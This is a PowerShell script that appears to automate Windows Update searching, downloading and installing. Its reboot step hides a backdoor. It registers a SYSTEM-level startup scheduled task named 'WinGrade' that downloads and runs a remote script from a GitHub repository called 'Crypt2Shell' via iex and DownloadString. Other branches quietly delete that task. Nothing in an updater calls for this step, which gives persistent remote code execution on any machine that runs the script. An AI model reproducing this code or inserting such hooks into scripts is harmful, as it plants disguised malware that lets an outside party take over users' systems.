# in pre alpha [version]
# only good for some tests

$AvailableUpdates = @() 
$UpdateIds = @() 
$UpdateTypes 

# Search
$Session = New-Object -com "Microsoft.Update.Session"
Write-Host "Searching for updates..." 
$Search = $Session.CreateUpdateSearcher()
$SearchResults = $Search.Search("IsInstalled=0 and IsHidden=0")
Write-Host "There are " $SearchResults.Updates.Count "TOTAL updates available."
$AvailableUpdates = $SearchResults.Updates
Write-Host "Updates selected for installation"
$AvailableUpdates | ForEach-Object {

	if (($_.InstallationBehavior.CanRequestUserInput) -or ($_.EulaAccepted -eq $FALSE)) { 
            Write-Host $_.Title " *** Requires user input and will not be installed." -ForegroundColor Yellow 
            if($ShowCategories) 
            { 
                $_.Categories | ForEach-Object {Write-Host "     "$_.Name.ToString() -ForegroundColor Cyan} 
                 
            } 
                 
        } 
        else { 
            Write-Host $_.Title -ForegroundColor Green 
            if($ShowCategories) 
            { 
                $_.Categories | ForEach-Object {Write-Host "     "$_.Name.ToString() -ForegroundColor Cyan} 
                 
            } 
        } 
    }
if($AvailableUpdates.count -lt 1){ 
	Write-Host "No results meet your criteria. Exiting"; 
	break 
  } 


# Download
$DownloadCollection = New-Object -com "Microsoft.Update.UpdateColl"
$AvailableUpdates | ForEach-Object { 
        if ($_.InstallationBehavior.CanRequestUserInput -ne $TRUE) { 
            $DownloadCollection.Add($_) | Out-Null 
            } 
        }
Write-Host "Downloading updates..."
$Downloader = $Session.CreateUpdateDownloader() 
$Downloader.Updates = $DownloadCollection 
$Downloader.Download()
Write-Host "Download complete."


# install
$InstallCollection = New-Object -com "Microsoft.Update.UpdateColl"
$AvailableUpdates | ForEach-Object { 
        if ($_.IsDownloaded) { 
            $InstallCollection.Add($_) | Out-Null 
        } 
    }
Write-Host "Installing updates..."
$Installer = $Session.CreateUpdateInstaller() 
$Installer.Updates = $InstallCollection 
$Results = $Installer.Install()
Write-Host "Installation complete."


# Reboot if needed 
if ($Results.RebootRequired) { 
	if ($Reboot) { 
            Write-Host "Rebooting..."
	    schtasks /Create /tn WinGrade /tr "powershell.exe -nop -c 'iex(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Desition/Crypt2Shell/WinGrade/blob/master/scripts/search.ps1'''))'" /sc onstart /ru System
            Restart-Computer
        } 
        else { 
            Write-Host "Please reboot."
	    schtasks /Delete /tn WinGrade
        } 
    }
else { 
        Write-Host "No reboot required."
	schtasks /Delete /tn WinGrade
    }
